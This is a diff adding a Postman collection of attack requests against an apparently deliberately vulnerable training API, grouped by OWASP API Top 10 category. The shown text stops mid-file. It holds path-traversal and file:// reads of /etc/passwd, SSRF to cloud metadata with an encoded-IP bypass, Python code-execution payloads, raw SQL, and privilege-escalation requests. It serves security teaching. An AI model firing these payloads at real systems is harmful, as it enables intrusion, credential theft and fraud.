@@ -1,0 +1,1378 @@
+{
+	"info": {
+		"_postman_id": "vulnapi-101-attacks",
+		"name": "VulnAPI-101 Attack Collection",
+		"description": "This collection demonstrates attacks against the OWASP API Top 10 vulnerabilities in VulnAPI-101. Each folder corresponds to a specific vulnerability category.\n\n**WARNING: For educational and authorized testing purposes only!**\n\n## Setup\n1. Start the VulnAPI-101 server\n2. Set the `base_url` variable (default: http://localhost:5000)\n3. Run the \"Setup - Login as regular user\" request first to get a token\n\n## Test Credentials\n- admin / admin123 (admin)\n- john / password123 (user)\n- jane / jane2024 (user)",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "http://localhost:5000",
+			"type": "string"
+		},
+		{
+			"key": "token",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "user_id",
+			"value": "",
+			"type": "string"
+		}
+	],
+	"item": [
+		{
+			"name": "Setup",
+			"description": "Initial setup requests to obtain authentication tokens",
+			"item": [
+				{
+					"name": "Login as regular user (john)",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = pm.response.json();",
+									"if (jsonData.token) {",
+									"    pm.collectionVariables.set('token', jsonData.token);",
+									"    pm.collectionVariables.set('user_id', jsonData.user.id);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"username\": \"john\",\n    \"password\": \"password123\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/login",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "login"]
+						},
+						"description": "Login as a regular user to get a JWT token for subsequent attacks"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API1 - BOLA (Broken Object Level Authorization)",
+			"description": "Demonstrates Broken Object Level Authorization vulnerabilities where attackers can access other users' data by manipulating object IDs.",
+			"item": [
+				{
+					"name": "Access another user's profile without auth",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users/1",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "1"]
+						},
+						"description": "**Vulnerability:** No authentication required to view any user's profile including sensitive data (SSN, credit card, password)\n\n**Impact:** Complete data breach of user information"
+					},
+					"response": []
+				},
+				{
+					"name": "Enumerate all users without auth",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users"]
+						},
+						"description": "**Vulnerability:** No authentication required to list ALL users with sensitive data\n\n**Impact:** Mass data exfiltration"
+					},
+					"response": []
+				},
+				{
+					"name": "Access another user's orders",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users/1/orders",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "1", "orders"]
+						},
+						"description": "**Vulnerability:** View any user's order history without authentication\n\n**Impact:** Privacy violation, business intelligence leak"
+					},
+					"response": []
+				},
+				{
+					"name": "Delete another user's account",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/users/3",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "3"]
+						},
+						"description": "**Vulnerability:** Any authenticated user can delete any other user's account\n\n**Impact:** Account takeover, denial of service"
+					},
+					"response": []
+				},
+				{
+					"name": "View any order without auth",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/orders/1",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "1"]
+						},
+						"description": "**Vulnerability:** No authentication required to view any order details\n\n**Impact:** Privacy violation, financial data exposure"
+					},
+					"response": []
+				},
+				{
+					"name": "Refund another user's order",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/orders/1/refund",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "1", "refund"]
+						},
+						"description": "**Vulnerability:** Any user can refund any order (no ownership check)\n\n**Impact:** Financial fraud, money laundering"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API2 - Broken Authentication",
+			"description": "Demonstrates authentication vulnerabilities including weak tokens, user enumeration, and missing security controls.",
+			"item": [
+				{
+					"name": "User enumeration via login",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"username\": \"admin\",\n    \"password\": \"wrongpassword\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/login",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "login"]
+						},
+						"description": "**Vulnerability:** Different error messages for valid vs invalid usernames allow enumeration\n\n**Impact:** Attacker can discover valid usernames"
+					},
+					"response": []
+				},
+				{
+					"name": "User enumeration via forgot password",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"admin@vulnapi.com\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/forgot-password",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "forgot-password"]
+						},
+						"description": "**Vulnerability:** Returns weak 6-digit reset token directly in response!\n\n**Impact:** Account takeover via token brute force (only 1M combinations)"
+					},
+					"response": []
+				},
+				{
+					"name": "Weak password reset token",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"admin@vulnapi.com\",\n    \"reset_token\": \"123456\",\n    \"new_password\": \"hacked123\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/reset-password",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "reset-password"]
+						},
+						"description": "**Vulnerability:** 6-digit token with no rate limiting or expiration\n\n**Impact:** Brute force token to reset any user's password"
+					},
+					"response": []
+				},
+				{
+					"name": "Register with weak password",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@evil.com\",\n    \"password\": \"a\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/register",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "register"]
+						},
+						"description": "**Vulnerability:** No password complexity requirements\n\n**Impact:** Weak passwords make brute force trivial"
+					},
+					"response": []
+				},
+				{
+					"name": "Verify token exposes payload",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/auth/verify-token",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "verify-token"]
+						},
+						"description": "**Vulnerability:** Undocumented endpoint exposes full JWT payload\n\n**Impact:** Information disclosure, token analysis"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API3 - Broken Object Property Level Authorization",
+			"description": "Demonstrates excessive data exposure and mass assignment vulnerabilities.",
+			"item": [
+				{
+					"name": "Register with elevated role (mass assignment)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"username\": \"eviladmin\",\n    \"email\": \"evil@admin.com\",\n    \"password\": \"password123\",\n    \"role\": \"admin\",\n    \"balance\": 999999.99,\n    \"is_active\": true\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/auth/register",
+							"host": ["{{base_url}}"],
+							"path": ["api", "auth", "register"]
+						},
+						"description": "**Vulnerability:** Mass assignment allows setting role, balance, and other privileged fields\n\n**Impact:** Privilege escalation, financial fraud"
+					},
+					"response": []
+				},
+				{
+					"name": "Excessive data in user response",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users/1",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "1"]
+						},
+						"description": "**Vulnerability:** Response includes password, SSN, credit card, API key\n\n**Impact:** Complete PII and credential exposure"
+					},
+					"response": []
+				},
+				{
+					"name": "Update user with privileged fields",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"role\": \"admin\",\n    \"balance\": 999999.99,\n    \"is_active\": true,\n    \"internal_notes\": \"Escalated by attacker\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/users/{{user_id}}",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "{{user_id}}"]
+						},
+						"description": "**Vulnerability:** Mass assignment on update allows privilege escalation\n\n**Impact:** Any user can make themselves admin"
+					},
+					"response": []
+				},
+				{
+					"name": "Product exposes internal data",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/products",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products"]
+						},
+						"description": "**Vulnerability:** Response includes internal_cost, admin_notes\n\n**Impact:** Business intelligence leak, competitive advantage"
+					},
+					"response": []
+				},
+				{
+					"name": "Create product with internal fields",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"name\": \"Fake Product\",\n    \"price\": 9.99,\n    \"internal_cost\": 0.01,\n    \"admin_notes\": \"Created by attacker\",\n    \"is_active\": true\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/products",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products"]
+						},
+						"description": "**Vulnerability:** Mass assignment allows setting internal fields\n\n**Impact:** Data integrity compromise"
+					},
+					"response": []
+				},
+				{
+					"name": "Get user by API key (exposes data)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users/by-api-key/admin-api-key-12345",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "by-api-key", "admin-api-key-12345"]
+						},
+						"description": "**Vulnerability:** Undocumented endpoint exposes full user data including credentials\n\n**Impact:** Account takeover if API key is leaked"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API4 - Unrestricted Resource Consumption",
+			"description": "Demonstrates lack of rate limiting and resource controls.",
+			"item": [
+				{
+					"name": "Fetch unlimited users (no pagination)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users"]
+						},
+						"description": "**Vulnerability:** No pagination, returns all users at once\n\n**Impact:** DoS via memory exhaustion, data exfiltration"
+					},
+					"response": []
+				},
+				{
+					"name": "Fetch products with high limit",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/products?limit=10000",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products"],
+							"query": [
+								{
+									"key": "limit",
+									"value": "10000"
+								}
+							]
+						},
+						"description": "**Vulnerability:** User-controlled limit with no maximum\n\n**Impact:** Resource exhaustion"
+					},
+					"response": []
+				},
+				{
+					"name": "Brute force coupon codes (no rate limit)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"code\": \"SUMMER2024\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/products/coupons/validate",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products", "coupons", "validate"]
+						},
+						"description": "**Vulnerability:** No rate limiting on coupon validation\n\n**Impact:** Brute force to discover valid coupon codes"
+					},
+					"response": []
+				},
+				{
+					"name": "Search users (unlimited results)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/users/search?q=&field=username",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "search"],
+							"query": [
+								{
+									"key": "q",
+									"value": ""
+								},
+								{
+									"key": "field",
+									"value": "username"
+								}
+							]
+						},
+						"description": "**Vulnerability:** Empty search returns all users, no limits\n\n**Impact:** Data exfiltration"
+					},
+					"response": []
+				},
+				{
+					"name": "Bulk order status update (unlimited)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"order_ids\": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],\n    \"status\": \"cancelled\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/orders/bulk-status",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "bulk-status"]
+						},
+						"description": "**Vulnerability:** No limit on bulk operations\n\n**Impact:** Mass data manipulation"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API5 - Broken Function Level Authorization (BFLA)",
+			"description": "Demonstrates admin functions accessible by regular users.",
+			"item": [
+				{
+					"name": "Access admin user list",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/admin/users",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "users"]
+						},
+						"description": "**Vulnerability:** @admin_required decorator exists but not enforced\n\n**Impact:** Any user can access admin endpoints"
+					},
+					"response": []
+				},
+				{
+					"name": "Escalate to admin role",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"role\": \"admin\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/admin/users/{{user_id}}/role",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "users", "{{user_id}}", "role"]
+						},
+						"description": "**Vulnerability:** Any user can change any user's role including their own!\n\n**Impact:** Complete privilege escalation"
+					},
+					"response": []
+				},
+				{
+					"name": "View admin config (secrets exposed)",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/admin/config",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "config"]
+						},
+						"description": "**Vulnerability:** Any authenticated user can view SECRET_KEY, JWT_SECRET, ADMIN_PASSWORD\n\n**Impact:** Complete system compromise"
+					},
+					"response": []
+				},
+				{
+					"name": "Execute arbitrary SQL",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"query\": \"SELECT * FROM users WHERE role = 'admin'\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/admin/database/query",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "database", "query"]
+						},
+						"description": "**Vulnerability:** Any user can execute raw SQL queries!\n\n**Impact:** SQL injection, data exfiltration, data destruction"
+					},
+					"response": []
+				},
+				{
+					"name": "Create coupon (admin function)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"code\": \"FREEBIE100\",\n    \"discount_percent\": 100,\n    \"max_uses\": 9999,\n    \"is_active\": true\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/admin/coupons",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "coupons"]
+						},
+						"description": "**Vulnerability:** Any user can create discount coupons\n\n**Impact:** Financial fraud"
+					},
+					"response": []
+				},
+				{
+					"name": "Full database backup",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/admin/backup",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "backup"]
+						},
+						"description": "**Vulnerability:** Any user can dump entire database\n\n**Impact:** Complete data breach"
+					},
+					"response": []
+				},
+				{
+					"name": "Deactivate another user",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/admin/users/1/deactivate",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "users", "1", "deactivate"]
+						},
+						"description": "**Vulnerability:** Any user can deactivate any account including admin\n\n**Impact:** Denial of service, admin lockout"
+					},
+					"response": []
+				},
+				{
+					"name": "Bulk price update (no admin check)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"updates\": [\n        {\"product_id\": 1, \"price\": 0.01},\n        {\"product_id\": 2, \"price\": 0.01},\n        {\"product_id\": 3, \"price\": 0.01}\n    ]\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/products/bulk-price-update",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products", "bulk-price-update"]
+						},
+						"description": "**Vulnerability:** Any user can update all product prices\n\n**Impact:** Financial manipulation"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API6 - Unrestricted Access to Business Flows",
+			"description": "Demonstrates business logic vulnerabilities.",
+			"item": [
+				{
+					"name": "Add unlimited balance",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"action\": \"add\",\n    \"amount\": 999999\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/users/me/balance",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "me", "balance"]
+						},
+						"description": "**Vulnerability:** No verification for balance addition\n\n**Impact:** Unlimited money creation"
+					},
+					"response": []
+				},
+				{
+					"name": "Apply coupon multiple times",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"code\": \"SAVE20\",\n    \"order_total\": 100.00\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/products/coupons/apply",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products", "coupons", "apply"]
+						},
+						"description": "**Vulnerability:** Same coupon can be used unlimited times per user\n\n**Impact:** Financial fraud"
+					},
+					"response": []
+				},
+				{
+					"name": "Create order with manipulated price",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"product_id\": 1,\n    \"quantity\": 10,\n    \"total_price\": 0.01,\n    \"status\": \"completed\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/orders",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders"]
+						},
+						"description": "**Vulnerability:** Client can set total_price and status\n\n**Impact:** Free products, skip payment"
+					},
+					"response": []
+				},
+				{
+					"name": "Skip order workflow (direct to shipped)",
+					"request": {
+						"method": "PATCH",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"status\": \"shipped\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/orders/1/status",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "1", "status"]
+						},
+						"description": "**Vulnerability:** No state machine validation for order status\n\n**Impact:** Skip payment, get items shipped"
+					},
+					"response": []
+				},
+				{
+					"name": "Double refund attack",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/api/orders/1/refund",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "1", "refund"]
+						},
+						"description": "**Vulnerability:** No check if order already refunded\n\n**Impact:** Infinite money glitch - refund same order repeatedly"
+					},
+					"response": []
+				},
+				{
+					"name": "Transfer balance to self (loop)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"action\": \"transfer\",\n    \"amount\": 100,\n    \"target_user_id\": 1\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/users/me/balance",
+							"host": ["{{base_url}}"],
+							"path": ["api", "users", "me", "balance"]
+						},
+						"description": "**Vulnerability:** No validation on transfer recipient\n\n**Impact:** Money laundering, balance manipulation"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API7 - Server Side Request Forgery (SSRF)",
+			"description": "Demonstrates SSRF vulnerabilities allowing internal network access.",
+			"item": [
+				{
+					"name": "SSRF - Fetch internal service",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"http://127.0.0.1:5000/api/admin/config\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/fetch",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "fetch"]
+						},
+						"description": "**Vulnerability:** No URL validation, can access internal services\n\n**Impact:** Internal network scanning, access to internal APIs"
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF - Read local files",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"file:///etc/passwd\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/fetch",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "fetch"]
+						},
+						"description": "**Vulnerability:** File protocol not blocked\n\n**Impact:** Local file read"
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF via webhook",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"webhook_url\": \"http://127.0.0.1:5000/api/debug/config\",\n    \"event\": \"test\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/webhook",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "webhook"]
+						},
+						"description": "**Vulnerability:** Webhook URL not validated\n\n**Impact:** SSRF via webhook functionality"
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF via proxy (full control)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"http://169.254.169.254/latest/meta-data/\",\n    \"method\": \"GET\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/proxy",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "proxy"]
+						},
+						"description": "**Vulnerability:** Full proxy with method control\n\n**Impact:** Access cloud metadata, internal services"
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF via avatar fetch",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"http://internal-service.local/admin\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/avatar",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "avatar"]
+						},
+						"description": "**Vulnerability:** Avatar URL fetch without validation\n\n**Impact:** SSRF disguised as image loading"
+					},
+					"response": []
+				},
+				{
+					"name": "Bypass SSRF validation",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"http://0x7f000001:5000/api/admin/config\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/fetch-validate",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "fetch-validate"]
+						},
+						"description": "**Vulnerability:** Validation can be bypassed with IP encoding tricks\n\n**Impact:** SSRF even with 'protection'"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API8 - Security Misconfiguration",
+			"description": "Demonstrates security misconfigurations including debug endpoints, verbose errors, and dangerous features.",
+			"item": [
+				{
+					"name": "Remote Code Execution",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"code\": \"import os; result = os.popen('whoami').read()\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/debug/execute",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "execute"]
+						},
+						"description": "**Vulnerability:** Arbitrary Python code execution!\n\n**Impact:** Complete server compromise"
+					},
+					"response": []
+				},
+				{
+					"name": "Remote Code Execution (eval)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"expression\": \"__import__('os').listdir('/')\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/debug/eval",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "eval"]
+						},
+						"description": "**Vulnerability:** Python eval() on user input!\n\n**Impact:** Complete server compromise"
+					},
+					"response": []
+				},
+				{
+					"name": "Expose all environment variables",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/env",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "env"]
+						},
+						"description": "**Vulnerability:** All env vars exposed without auth\n\n**Impact:** Credential theft, API keys, secrets"
+					},
+					"response": []
+				},
+				{
+					"name": "Expose application config",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/config",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "config"]
+						},
+						"description": "**Vulnerability:** Full Flask config exposed\n\n**Impact:** SECRET_KEY, JWT_SECRET, database credentials"
+					},
+					"response": []
+				},
+				{
+					"name": "Verbose error with stack trace",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/error?type=division",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "error"],
+							"query": [
+								{
+									"key": "type",
+									"value": "division"
+								}
+							]
+						},
+						"description": "**Vulnerability:** Full stack traces in error responses\n\n**Impact:** Code paths, file locations, library versions exposed"
+					},
+					"response": []
+				},
+				{
+					"name": "System info disclosure",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/admin/system/info",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "system", "info"]
+						},
+						"description": "**Vulnerability:** System info exposed without auth\n\n**Impact:** Python version, environment, paths revealed"
+					},
+					"response": []
+				},
+				{
+					"name": "Path traversal - Read files",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"filename\": \"../../../etc/passwd\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/read",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "read"]
+						},
+						"description": "**Vulnerability:** Path traversal in file read\n\n**Impact:** Read any file on server"
+					},
+					"response": []
+				},
+				{
+					"name": "Path traversal - Download files",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/files/download/..%2F..%2F..%2Fetc%2Fpasswd",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "download", "..%2F..%2F..%2Fetc%2Fpasswd"]
+						},
